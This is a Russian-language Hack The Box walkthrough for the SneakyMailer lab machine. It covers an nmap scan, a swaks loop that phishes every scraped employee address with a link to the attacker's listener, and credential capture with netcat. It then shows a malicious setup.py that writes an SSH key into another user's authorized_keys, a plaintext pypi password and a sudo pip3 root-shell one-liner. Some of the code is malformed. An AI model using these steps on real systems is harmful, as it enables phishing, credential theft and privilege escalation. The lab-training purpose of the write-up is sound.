Дисклеймер.  
Все инструменты описанные в данной статье реальны, находятся в свободном доступе и используются специалистами по Информационной Безопасности для проведения тестирования на проникновение информационных систем компаний и предприятий. Автор статьи не занимается взломом и не поощряет подобных действий, все описанное ниже было выполнено на специально подготовленной для этого виртуальной машине.

Наконец переходим в машинам средней сложности. Как обычно начинаем с [[nmap]]
```bash
Host is up (0.12s latency).

Not shown: 993 closed ports

PORT STATE SERVICE VERSION

21/tcp open ftp vsftpd 3.0.3

22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey:

| 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)

| 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)

|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)

25/tcp open smtp Postfix smtpd

|smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,

80/tcp open http nginx 1.14.2

|http-server-header: nginx/1.14.2

|http-title: Did not follow redirect to http://sneakycorp.htb

143/tcp open imap Courier Imapd (released 2018)

|imap-capabilities: SORT CHILDREN THREAD=REFERENCES OK THREAD=ORDEREDSUBJECT STARTTLS UIDPLUS ENABLE IMAP4rev1 ACL IDLE completed ACL2=UNION UTF8=ACCEPTA0001 CAPABILITY QUOTA NAMESPACE

| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US

| Subject Alternative Name: email:postmaster@example.com

| Not valid before: 2020-05-14T17:14:21

|Not valid after: 2021-05-14T17:14:21

|ssl-date: TLS randomness does not represent time

993/tcp open ssl/imap Courier Imapd (released 2018)

|imap-capabilities: SORT CHILDREN THREAD=REFERENCES OK THREAD=ORDEREDSUBJECT UIDPLUS AUTH=PLAIN ENABLE IMAP4rev1 ACL IDLE completed ACL2=UNION NAMESPACE CAPABILITY QUOTA UTF8=ACCEPTA0001

| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US

| Subject Alternative Name: email:postmaster@example.com

| Not valid before: 2020-05-14T17:14:21

|Not valid after: 2021-05-14T17:14:21

|ssl-date: TLS randomness does not represent time

8080/tcp open http nginx 1.14.2

|http-open-proxy: Proxy might be redirecting requests

|http-server-header: nginx/1.14.2

|http-title: Welcome to nginx!

Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

не так много но есть и кое что новое, на сервере запущена почтовая служба

зайдем на сайт, нас тут же редиректит на домен **sneakycorp.htb**добавим его в **/etc/hosts** и обновим страницу.

У нас есть сайт, можно попробовать запустить [[gobuster]], а пока посмотреть 8080 и [[ftp]], на 8080 ничего интересного, а на [[ftp]] нужен логин.

[[gobuster]] нашел вкладку team, посмотрим что тут.  
Хм, видимо список работников. Надо бы забрать email, многие компании его используют в качестве логина.

Воспользуемся любым [[Вебсайты#Экстрактор почт из WEB страницы]], например email-checker.net/extract

получим файл с почтами всех сотрудников, векторов атаки осталось не то чтобы много… пойдем на рыбалку?
[[swaks]]

``` bash
while read mail; do swaks --to $mail --from it@sneakymailer.htb --header «Subject: Credentials / Errors» --body «goto http://10.10.15.253/» --server 10.10.10.197; done < mails.txt
```

 ```bash
nc -lvnp 80
```

устроим нечто наподобие сниффинга трафика, вдруг кто забыл пароль и мы сможем перехватить сообщение техподдержки почтового сервиса.  
Процесс нехитрый, но долгий, у меня получилось со второго раза(

ловим [[HTTP]] пакет в котором все нужные данные в URL кодировке, любым декодером достаем пароль и записываем оттуда же и email сотрудника.

установим [[evolution]] — почтовый клиент для linux систем. настроим и зайдем под этим сотрудником. Прошерстим папки.

В отправленных находим запрос на смену пароля от акка с ником разработчика, в качестве подтверждения отправлен текущий пароль, будем наедятся админ не успел его сменить.

Попробуем зайти на [[FTP]] и у нас выходит, папка /dev, возможно под домен?, отредактируем **/etc/hosts** и посмотрим, так и есть. И раз у нас есть доступ к файлам сайта, выбросим shell.

Получили www-data доступ, быстро зайдем под разрабом т. к знаем его пароль. походим по папкам, узнаем о существовании под домена [[pypi]], придется его тоже добавить, также узнаем что user.txt находится у другого пользователя.

получше изучим [[pypi]] на сайте видно что для изменения нужна аутентификация, и через шелл мы можем только смотреть, этого хватит, так как мы можем найти логин и пароль в скрытом файле. Осталось разгадать хэш пароля, ну тут тоже ничего сложного.

Однако, банальная аутентификация нам тоже ничего не дала, попробуем заабузить установку модуля тем более **sudo -l** дает нам понять что мы могем.

придется попрогать и поиграть в гадалку

для начала из мануалов становится понятно, что надо с нуля написать файл конфигурации

```
distutils index-servers =

index-servers =

local

local

repository: **

username: pypi

password: soufianeelhaoui
```

получилось что-то вроде такого, а теперь еще и с нуля написать модуль и установщик

```python
try:

with open("/home/low/.ssh/authorized_keys","a") as f:

f.write("key")

f.close()

except Exception as e:

pass

import setuptools

setuptools.setup(

name="kali_username",version="0.0.1",author="Example Author",author_email="author@example.com",descripion="just a file",

long_description="",long_description_content_type="text/markdown",url="https://github.com/pypa/sampleproject",

package=setuptools.find_packages(),classifiers="Programming Language :: Python :: 3","License :: OSI Approved :: MIT License","Operating System :: OS Independent")
```

что-то вроде этого сработало, сначала я пытался написать банальный шелл, после того как убедился в том что все это запускается под тем кем нужно, но шелл возвращал меня в ту же точку, поэтому верным решением было бы создать [[ssh]] ключ, так и поступим.

```bash
python setup.py sdist register -r local upload -r local
```

залогинелсь под юзером, сдали флаг. Остался root.

по доброй традиции **sudo -l**

вывод дает нам понять, что мы можем запустить **pip** от root`а

Идеально, а теперь напишем свой модуль

```bash
TF=$(mktemp -d)

echo "import os; os.execl('/bin/sh','sh','-c','sh <(tty) >(tty) 2>$(tty)')" > $TF/setup.py

sudo pip3 install $TF
```

вот такое чудо работает прекрасно.

осталось запустить написанный sh скрипт.

И мы root.1